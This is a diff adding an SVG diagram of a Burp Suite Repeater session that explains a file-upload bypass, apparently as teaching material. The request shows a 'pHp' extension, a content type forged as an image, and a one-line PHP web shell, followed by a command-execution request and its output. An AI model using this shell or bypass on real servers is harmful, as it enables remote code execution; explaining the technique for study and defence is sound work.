@@ -1,0 +1,75 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 840 500" width="840" height="500" role="img" aria-labelledby="t d">
+  <title id="t">Burp Suite Repeater schematic, the file upload request</title>
+  <desc id="d">A drawn representation of Burp Suite's Repeater, split into a request pane on the left and a response pane on the right. The request is a multipart file upload where the filename carries an executable extension and the content type is set to an image type to slip past a check that only reads the declared type. The response confirms the file was saved. Numbered callouts point to the forged content type, the executable extension, and the server's confirmation. A footer states this is a schematic illustration and not a screen capture.</desc>
+  <style>
+    text { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+    .mono { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; }
+    .h1 { fill: #1f2328; font-size: 15px; font-weight: 600; }
+    .sub{ fill: #656d76; font-size: 11px; }
+    .app { fill: #2b2b2b; stroke: #1c1c1c; stroke-width: 1.3; }
+    .bar { fill: #e36209; }
+    .pane{ fill: #1e1e1e; stroke: #3c3c3c; stroke-width: 1.1; }
+    .paneh { fill: #333333; }
+    .tab { fill: #ffffff; font-size: 11px; font-weight: 700; }
+    .ph  { fill: #d0d0d0; font-size: 10.5px; font-weight: 700; }
+    .req { fill: #d4d4d4; font-size: 10.5px; }
+    .key { fill: #9cdcfe; font-size: 10.5px; }
+    .hi  { fill: #ffb454; font-size: 10.5px; font-weight: 700; }
+    .ok  { fill: #7ee787; font-size: 10.5px; }
+    .send{ fill: #ffffff; font-size: 11px; font-weight: 700; text-anchor: middle; }
+    .sendb { fill: #e36209; }
+    .cnum { fill: #ffffff; font-size: 11px; font-weight: 700; text-anchor: middle; }
+    .cc   { fill: #cf222e; stroke: #ffffff; stroke-width: 1.2; }
+    .clbl { fill: #a40e26; font-size: 10.5px; font-weight: 700; }
+    .foot { fill: #656d76; font-size: 10.5px; font-style: italic; }
+    @media (prefers-color-scheme: dark) {
+      .h1 { fill: #e6edf3; } .sub { fill: #8b949e; } .foot { fill: #8b949e; }
+      .clbl { fill: #ff7b72; }
+    }
+  </style>
+  <text class="h1"  x="20" y="26">Burp Suite Repeater</text>
+  <text class="sub" x="20" y="44">The upload request, edited by hand to smuggle a script past the check.</text>
+
+  <rect class="app" x="20" y="58" width="800" height="400" rx="6"/>
+  <rect class="bar" x="20" y="58" width="800" height="24" rx="6"/>
+  <text class="tab" x="34" y="75">Burp Suite  ::  Repeater</text>
+  <rect class="sendb" x="720" y="62" width="84" height="16" rx="3"/>
+  <text class="send" x="762" y="74">Send</text>
+
+  <!-- request pane -->
+  <rect class="paneh" x="34" y="92" width="380" height="20"/>
+  <text class="ph" x="44" y="106">Request</text>
+  <rect class="pane" x="34" y="112" width="380" height="330"/>
+  <text class="mono req" x="44" y="134">POST /uploads/avatar HTTP/1.1</text>
+  <text class="mono req" x="44" y="152">Host: dev-shop.harbor</text>
+  <text class="mono req" x="44" y="170">Content-Type: multipart/form-data;</text>
+  <text class="mono req" x="60" y="188">boundary=----x</text>
+  <text class="mono req" x="44" y="214">------x</text>
+  <text class="mono req" x="44" y="232">Content-Disposition: form-data;</text>
+  <text class="mono req" x="60" y="250">name="file";</text>
+  <text class="mono hi"  x="60" y="268">filename="avatar.pHp"</text>
+  <text class="mono hi"  x="44" y="290">Content-Type: image/png</text>
+  <text class="mono req" x="44" y="316">------x</text>
+  <text class="mono key" x="44" y="342">&lt;?php system($_GET['c']); ?&gt;</text>
+  <text class="mono req" x="44" y="368">------x--</text>
+
+  <!-- response pane -->
+  <rect class="paneh" x="426" y="92" width="330" height="20"/>
+  <text class="ph" x="436" y="106">Response</text>
+  <rect class="pane" x="426" y="112" width="330" height="330"/>
+  <text class="mono req" x="436" y="134">HTTP/1.1 200 OK</text>
+  <text class="mono req" x="436" y="152">Content-Type: application/json</text>
+  <text class="mono ok"  x="436" y="182">{ "status": "ok",</text>
+  <text class="mono ok"  x="452" y="200">"saved": "/uploads/avatar.pHp" }</text>
+  <text class="mono req" x="436" y="234">Then, in the browser:</text>
+  <text class="mono key" x="436" y="256">GET /uploads/avatar.pHp?c=id</text>
+  <text class="mono ok"  x="436" y="278">uid=33(www-data) gid=33(www-data)</text>
+  <text class="mono hi"  x="436" y="308">code execution as www-data</text>
+
+  <!-- callouts -->
+  <circle class="cc" cx="360" cy="268" r="11"/><text class="cnum" x="360" y="272">1</text>
+  <circle class="cc" cx="316" cy="290" r="11"/><text class="cnum" x="316" y="294">2</text>
+  <circle class="cc" cx="700" cy="278" r="11"/><text class="cnum" x="700" y="282">3</text>
+
+  <text class="foot" x="20" y="478">1 executable extension  2 content type forged as an image  3 the server ran it.  Schematic illustration, not a screen capture.</text>
+</svg>
